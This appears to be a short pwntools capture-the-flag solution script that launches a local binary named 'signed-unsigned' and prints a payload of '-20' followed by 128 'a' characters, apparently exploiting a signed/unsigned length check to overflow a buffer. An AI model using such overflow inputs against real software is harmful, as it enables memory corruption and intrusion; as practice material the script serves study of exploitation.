from pwn import * 

target = process("./signed-unsigned")



print("Enter below payload: ")
print(str(-20) + "a"*0x80)

target.interactive()


